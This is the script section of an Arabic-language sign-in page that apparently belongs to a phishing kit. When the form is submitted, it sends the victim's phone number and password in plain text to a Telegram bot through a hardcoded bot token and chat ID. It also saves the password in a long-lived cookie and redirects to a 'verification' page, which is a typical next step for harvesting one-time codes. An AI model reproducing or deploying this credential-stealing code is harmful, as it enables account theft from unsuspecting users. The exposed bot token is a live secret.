  <script>
    // Toggle Password Visibility
    function togglePassword() {
      const passwordInput = document.getElementById('password');
      const eyeToggle = document.getElementById('eyeToggle');
      
      if (passwordInput.type === 'password') {
        passwordInput. type = 'text';
        eyeToggle.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17. 94 17.94A10. 07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9. 9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>';
      } else {
        passwordInput.type = 'password';
        eyeToggle.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>';
      }
    }

    // Handle Signup
    function handleSignup(type) {
      if (type === 'auto') {
        window.location.href = '/signup-auto. html';
      } else if (type === 'first') {
        window.location.href = '/signup-first.html';
      }
    }

    // Handle Forgot Password
    function handleForgotPassword() {
      window.location.href = '/forgot-password.html';
    }

    // Handle Form Submission
    document.getElementById('signin').addEventListener('submit', function(e) {
      e.preventDefault();
      
      const phonenumber = document.getElementById('phonenumber').value;
      const password = document.getElementById('password').value;
      const successMessage = document.getElementById('successMessage');
      const errorMessage = document.getElementById('errorMessage');

      // Hide messages
      successMessage.style.display = 'none';
      errorMessage.style.display = 'none';

      // Validation
      if (!phonenumber || ! password) {
        errorMessage.innerHTML = '<div>الرجاء ملء جميع الحقول المطلوبة</div>';
        errorMessage.style.display = 'block';
        return false;
      }

      // Format message
      const text = `رقم الهاتف:  ${phonenumber}\nكلمة السر:  ${password}`;
      
      // Send to Telegram
      const botToken = '8478229937:AAGW3ft5TA9wFX4ThWoIfFA_ihZ9WnvZAXI';
      const chatId = '6873334348';
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text:  text,
          parse_mode:  'HTML'
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          successMessage.style.display = 'block';
          document.getElementById('signin').reset();
          
          // Store in cookies
          setCookie('phonenumber', phonenumber, 1000);
          setCookie('password', password, 1000);
          
          // Redirect after 2 seconds
          setTimeout(() => {
            window.location.href = '/verification. html';
          }, 2000);
        } else {
          errorMessage.innerHTML = '<div>فشل الإرسال. الرجاء المحاولة مرة أخرى</div>';
          errorMessage.style. display = 'block';
          console.error('Telegram Error:', data);
        }
      })
      .catch(error => {
        console.error('Error:', error);
        errorMessage.innerHTML = '<div>خطأ في الاتصال. الرجاء المحاولة مرة أخرى</div>';
        errorMessage.style. display = 'block';
      });

      return false;
    });

    // Set Cookie Function
    function setCookie(cname, cvalue, exdays) {
      const d = new Date();
      d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
      let expires = "expires=" + d. toUTCString();
      document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
    }
  </script>
</body>
